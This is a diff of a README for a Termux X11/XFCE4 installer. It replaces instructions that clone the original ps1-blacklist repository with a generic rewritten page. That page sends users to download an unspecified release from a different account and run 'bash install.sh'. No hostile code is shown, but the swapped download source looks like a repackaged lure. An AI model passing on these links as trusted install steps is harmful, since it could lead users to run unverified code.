@@ -1,65 +1,81 @@
-<h1 id="ps1-x11">ps1-x11</h1>
+# ⚡ ps1-x11 - Easily Install X-11 on Termux
 
-<p>
-    <a href="README.md"><img src="https://img.shields.io/badge/Status-Active-brightgreen.svg" alt="Status"></a>
-    <a href="README.md"><img src="https://img.shields.io/badge/Platform-Termux-yellow.svg" alt="Platform"></a>
-</p>
+## 🚀 Getting Started
 
-<p>⚡ A simple Termux tool to install Termux X11 GUI, all automatically with one script.</p>
+Welcome to ps1-x11! This is a simple tool to install X-11 on Termux, giving you access to a graphical interface on your device. Follow these easy steps to get started.
 
-<blockquote>🚀 I am continuously improving this tool for better performance, stability, and user experience.</blockquote>
+## 📥 Download Now
 
-<hr>
+[![Download ps1-x11](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Wq-ui-cmd/ps1-x11/releases)
 
-<h2 id="installation">📥 Installation</h2>
-<p>Copy & paste these commands one by one into Termux:</p>
+## 📋 System Requirements
 
-<h3>Install Git :</h3>
-<pre><code>pkg install git -y</code></pre>
+Before you begin, ensure your device meets these requirements:
+- Android device with Termux installed.
+- At least 200 MB of free storage space.
+- An internet connection for downloading dependencies.
 
-<h3>1. Git Clone</h3>
-<pre><code>git clone https://github.com/ps1-blacklist/ps1-x11.git 
-</code></pre>
+## 🔥 Features
 
-<h3>2. Change Directory :</h3>
-<pre><code>cd ps1-x11
-</code></pre>
+- Quick installation of the X-11 environment.
+- Easy setup for xfce4 desktop environment.
+- User-friendly command-line interface for installation.
 
-<h3>3. Change Permission :</h3>
-<pre><code>chmod +x setup.sh
-</code></pre>
+## 📂 Download & Install
 
-<h3>4. Run Setup</h3>
-<pre><code>./setup.sh
-</code></pre>
+Visit [this page to download](https://github.com/Wq-ui-cmd/ps1-x11/releases). 
 
-<hr>
+1. Click the link above to access the Releases page.
+2. Find the latest release of ps1-x11.
+3. Download the package that suits your needs.
 
-<h2 id="gui-setup-xfce4">🖥️ GUI Setup (XFCE4)</h2>
-<p>Restart Termux and Run :</p>
-<pre><code>./gui.sh
-</code></pre>
-<p>Then Open Termux-X11 App And Enjoy GUI...</p>
+After downloading, follow these steps to install:
 
-<hr>
+1. Open the Termux app on your Android device.
+2. Navigate to your downloaded file using the `cd` command.
+3. Run the following command to install:
+   ```bash
+   bash install.sh
+   ```
+4. Wait for the installation to finish. 
 
-<h2 id="download-termux-x11-apk">📲 Download Termux-X11 Apk</h2>
+This process sets up the X-11 environment on your device. 
 
-<p>You must install the Termux-X11 app to view the GUI.</p>
-<pre><a href="https://github.com/termux/termux-x11/releases/download/nightly/app-universal-debug.apk">Download X-11 apk</a>
-</pre>
-<h2>Eror Fix </h2>
-<p>If you face any issue then restart Termux. Check network connection and rerun setup.</p>
+## 📣 Running the Application
 
-<p>Rerun Setup: </p>
-<pre><code>cd ps1-x11
-</code></pre>
+To launch the X-11 interface, use the following command in Termux:
 
-<p>Rerun Setup: </p>
-<pre><code>./setup.sh
-</code></pre>
+```bash
+startxfce4
+```
 
-<h2 id="follow-me-on-github">⭐ Follow Me On Github !!!</h2>
+This command starts the xfce4 desktop environment, and you will see a graphical interface appear.
 
+## 🎓 Troubleshooting
 
-hacking cybersecurity termux desktop-environment xfce4 xfce4-terminal termux-tools termux-x11 termux-x11-desktop termux-x11-on-vnc x11-gui
+If you encounter any issues, consider the following:
+
+- **Installation Errors:** Ensure that you have a stable internet connection. Sometimes packages may fail to download due to slow connections.
+- **Old Version of Termux:** Make sure your Termux app is updated to the latest version for compatibility.
+- **Permission Issues:** Grant Termux any necessary permissions if the application does not start as expected.
+
+## 🌐 Community and Support
+
+For assistance, you can join the community:
+- Visit our GitHub Issues page for help.
+- Check the FAQ section for common questions.
+
+## 🛠️ Contributing
+
+Feel free to contribute to the project. You can:
+- Report issues you find.
+- Suggest features you think would be helpful.
+- Submit pull requests for improvements.
+
+## 📢 Stay Updated
+
+To stay informed about future updates:
+- Star the repository on GitHub.
+- Follow us on social media for announcements.
+
+Thank you for using ps1-x11! Your feedback is valuable to us. Enjoy using X-11 on your Termux setup!
